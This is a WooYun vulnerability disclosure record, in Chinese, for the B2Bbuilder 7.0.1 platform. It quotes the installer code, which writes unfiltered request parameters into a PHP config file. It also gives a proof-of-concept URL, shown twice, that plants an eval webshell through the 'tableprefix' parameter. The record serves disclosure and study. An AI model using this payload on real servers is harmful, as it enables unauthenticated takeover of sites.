{"id": 33593, "wybug_id": "wooyun-2015-0108452", "wybug_title": "::B2Bbuilder::前台无限制Getshell", "wybug_corp": "shop-builder.cn", "wybug_author": "浅蓝", "wybug_date": "2015-04-23 18:02", "wybug_open_date": "2015-07-27 09:04", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向公众公开  简要描述： 下载地址 http://down.chinaz.com/soft/24224.htm 详细说明：  http://down.chinaz.com/soft/24224.htm7.0.1版本的。  和MallBuilder是同一个地方的/install/install.php看看代码吧\nif($action == \"setup\"){\t//检查参数是否完整\t$dbhost = $_GET['dbhost'];\t$port = $_GET['port'];\t$dbname = $_GET['dbname'];\t$dbuser = $_GET['dbuser'];\t$dbpassword = $_GET['dbpassword'];\t$tableprefix = $_GET['tableprefix'];\t$guid = $_GET['guid'];\tif(!$port)\t\t$port = 3306;\tif ($dbhost && $port && $dbname && $dbuser && $dbpassword && $tableprefix && $guid)\t{\t\tfile_put_contents(\"db.txt\", $dbhost.'|'.$port .'|'.$dbname .'|'.$dbuser .'|'.$dbpassword .'|'.$tableprefix.'|'.$guid);\t\t$link = mysql_connect($dbhost . \":\" . $port, $dbuser, $dbpassword);\t\tif($link)\t\t{\t\t\tmysql_query(\"CREATE DATABASE IF NOT EXISTS `\".$dbname.\"`;\", $link);\t\t\tmysql_query(\"SET NAMES 'utf8',character_set_client=binary,sql_mode='';\",$link);\t\t\t$link2 = mysql_select_db($dbname, $link);\t\t\tif($link2)\t\t\t{\t\t\t\t//==========================================================更新进度\t\t\t\tfile_put_contents('progress.txt', 10);\t\t\t\t//安装步骤1. 创建数据库结构\t\t\t\t$sqlfile = 'B2Bbuilder.sql';\t\t\t\t$query = '';\t\t\t\t$fp = fopen(dirname(__FILE__).'/' . $sqlfile,'r');\t\t\t\twhile($mysql=GetNextSQL())\t\t\t\t{\t\t\t\t\tmysql_query($mysql);\t\t\t\t}\t\t\t\tfclose($fp);\t\t\t\t//---------------------------------\t\t\t\t$rurl=$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];\t\t\t\t$aurl = explode(\"/\", $rurl);\t\t\t\t$realurl='';\t\t\t\tfor($i=0;$i<count($aurl)-2;$i++)\t\t\t\t\t   $realurl=$realurl.$aurl[$i].\"/\";\t\t\t\t$realurl=\"http://\".$realurl;\t\t\t\t$realurl=substr($realurl,0,-1);\t\t\t\t\t\t\t\t\t\t\t\t$burl=explode(\".\",$realurl);\t\t\t\t$pb=array_shift($burl);\t\t\t\t$baseurl=str_replace($pb.'.','',$_POST[\"weburl\"]);\t\t\t\t$baseurl=str_replace('http://','',$_POST[\"weburl\"]);\t\t\t\t$baseurl=explode('/',$baseurl);\t\t\t\t$baseurl=$baseurl[0];\t\t\t\tif(substr($baseurl,0,3)=='loc'||substr($baseurl,0,3)=='127')\t\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='' where `index`='baseurl'\");\t\t\t\telse\t\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='\".$baseurl.\"' where `index`='baseurl'\");\t\t\t\tmysql_query(\"update  \".$tableprefix.\"web_config  set `value`='$realurl' where `index`='weburl'\");\t\t\t\t//写系统配置文件\t\t\t\t$rsid=mysql_query(\"select * from  \".$tableprefix.\"web_config\");\t\t\t\t$arr=array(); $configs=array();\t\t\t\twhile($row=mysql_fetch_array($rsid))\t\t\t\t{ \t\t\t\t\t$arr[] = $row; \t\t\t\t} \t\t\t\tforeach($arr as $v)\t\t\t\t{\t\t\t\t\t$index=$v['index'];\t\t\t\t\t$value=$v['value'];\t\t\t\t\t$configs[$index]=$value;\t\t\t\t}\t\t\t\t$write_config_con_array=$configs;\t\t\t\t$write_config_con_str=serialize($write_config_con_array);//将数组序列化后生成字符串\t\t\t\t$write_config_con_str='<?php $config = array_merge($config, unserialize(\\''.$write_config_con_str.'\\'));?>';//生成要写的内容\t\t\t\t$cfp=fopen(dirname(__FILE__).'/../config/web_config.php','w');\t\t\t\tfwrite($cfp,$write_config_con_str,strlen($write_config_con_str));//将内容写入文件．\t\t\t\tfclose($cfp);//======================================================更新进度\t\t\t\tfile_put_contents('progress.txt', 30);\t\t\t\t\t\t\t\t/*\t\t\t\t//安装步骤2. 导入测试数据\t\t\t\t$sqlfile = 'data.txt';\t\t\t\t$query = '';\t\t\t\t$fp = fopen(dirname(__FILE__).'/' . $sqlfile,'r');\t\t\t\twhile(!feof($fp))\t\t\t\t{\t\t\t\t\t$line = rtrim(fgets($fp, 1024));\t\t\t\t\tif(preg_match(\"#;$#\", $line))\t\t\t\t\t{\t\t\t\t\t\t$query .= $line;\t\t\t\t\t\t$query = str_replace('{tableprefix}',$tableprefix,$query);\t\t\t\t\t\t$rs = mysql_query($query,$link);\t\t\t\t\t\t$query='';\t\t\t\t\t} else if(!preg_match(\"#^(\\/\\/|--)#\", $line))\t\t\t\t\t{\t\t\t\t\t\t$query .= $line;\t\t\t\t\t}\t\t\t\t}\t\t\t\tfclose($fp);\t\t\t\t\t\t\t*/\t\t\t\t//更新进度\t\t\t\tfile_put_contents('progress.txt', 70);\t\t\t\t//=======================================================安装步骤3. 配置文件修改\t\t\t\t$contents='<?php\t\t\t\t\t$config[\\'dbhost\\'] = \\''.$dbhost.'\\';      //数据库所在IP地址\t\t\t\t\t$config[\\'dbuser\\'] = \\''.$dbuser.'\\';  //数据库用户\t\t\t\t\t$config[\\'dbpass\\'] = \\''.$dbpassword.'\\';   \t //数据库密码\t\t\t\t\t$config[\\'dbname\\'] = \\''.$dbname.'\\';     //数据库名\t\t\t\t\t$config[\\'port\\'] = \\''.$port.'\\';     //端口\t\t\t\t\t$config[\\'table_pre\\']=\\''.$tableprefix.'\\';  //数据库表前缀\t\t\t\t\t$config[\\'authkey\\']=\\''.md5(time().rand(0,100000)).'\\';  //数据库表前缀\t\t\t\t\t?>';\t\t\t\t$filename = dirname(__FILE__).\"/../config/config.inc.php\"; \t\t\t\t$cfp = fopen($filename,'w'); \t\t\t\tfwrite($cfp,$contents); \t\t\t\tfclose($cfp);\t\t\t\t//更新进度\t\t\t\tfile_put_contents('progress.txt', 100);\t\t\t\toutputXml('200');\n他首先把 数据库配置信息写在了同目录的db.txt中 然后连接.判断是否连接成功 连接成功则执行 那些任务 否则出错在if($link)的判断中\n$contents='<?php\t\t\t\t\t$config[\\\\'dbhost\\\\'] = \\\\''.$dbhost.'\\\\';      //数据库所在IP地址\t\t\t\t\t$config[\\\\'dbuser\\\\'] = \\\\''.$dbuser.'\\\\';  //数据库用户\t\t\t\t\t$config[\\\\'dbpass\\\\'] = \\\\''.$dbpassword.'\\\\';   \t //数据库密码\t\t\t\t\t$config[\\\\'dbname\\\\'] = \\\\''.$dbname.'\\\\';     //数据库名\t\t\t\t\t$config[\\\\'port\\\\'] = \\\\''.$port.'\\\\';     //端口\t\t\t\t\t$config[\\\\'table_pre\\\\']=\\\\''.$tableprefix.'\\\\';  //数据库表前缀\t\t\t\t\t$config[\\\\'authkey\\\\']=\\\\''.md5(time().rand(0,100000)).'\\\\';  //数据库表前缀\t\t\t\t\t?>';\t\t\t\t$filename = dirname(__FILE__).\"/../config/config.inc.php\"; \t\t\t\t$cfp = fopen($filename,'w'); \t\t\t\tfwrite($cfp,$contents); \t\t\t\tfclose($cfp);\n意思是将数据库配置信息写在config/config.inc.php由于参数都没有进行过滤 导致 可以闭合界定符并注释掉后面的内容构造URL\nhttp://localhost/B2Bbuilder/install/install.php?action=setup&dbhost=localhost&port=3306&dbname=xxsb&dbuser=root&dbpassword=root&tableprefix=xxxx';eval($_REQUEST[xsec]);//&guid=xxxx\n只需要自己准备一个数据库并填入相对应的地方 提交即可getshell\n\n不用去理会xml报错。   漏洞证明：  \nhttp://localhost/B2Bbuilder/install/install.php?action=setup&dbhost=localhost&port=3306&dbname=xxsb&dbuser=root&dbpassword=root&tableprefix=xxxx';eval($_REQUEST[xsec]);//&guid=xxxx\n\n\n   修复方案：     版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-04-28 09:02 厂商回复： 处理中，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}